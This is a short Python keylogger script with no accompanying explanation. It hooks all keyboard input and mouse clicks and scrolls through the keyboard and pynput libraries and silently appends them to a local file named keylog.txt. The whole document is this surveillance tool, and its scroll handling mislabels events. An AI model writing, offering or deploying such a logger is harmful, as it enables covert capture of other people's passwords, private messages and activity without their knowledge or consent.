import keyboard
from pynput import mouse

def log_key(event):
    if event.event_type == "down":
        with open("keylog.txt", "a") as f:
            f.write(" " if event.name == 'space' else (" " + "backspace" if event.name == 'backspace' else (" " + event.name + "\n" if event.name == 'enter' else event.name)))

def log_mouse(x, y, button, pressed):
    action = f"{'Pressed' if pressed else 'Released'} {button} at ({x}, {y})"
    with open("keylog.txt", "a") as f:
        f.write(action + "\n")

keyboard.hook(log_key)

mouse_listener = mouse.Listener(on_click=log_mouse, on_scroll=log_mouse)
mouse_listener.start()

keyboard.wait()
